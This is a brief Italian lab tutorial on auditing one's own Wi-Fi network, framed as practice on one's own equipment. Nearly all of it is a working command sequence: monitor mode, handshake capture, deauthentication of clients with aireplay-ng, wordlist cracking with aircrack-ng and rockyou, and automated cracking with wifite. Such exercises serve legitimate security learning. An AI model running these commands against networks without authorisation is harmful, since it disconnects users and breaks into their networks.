# Scenario guidato: audit di una rete Wi-Fi (la TUA)

Richiede un adattatore Wi-Fi USB con monitor mode (in VirtualBox).
Esercitati SOLO sulla tua rete.

## 1. Attiva la monitor mode
```
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

## 2. Cattura l'handshake della tua rete
```
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cattura wlan0mon
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

## 3. Prova a recuperare la password (solo la tua)
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt cattura-01.cap
```

## 4. Alternativa automatica
```
sudo wifite
```
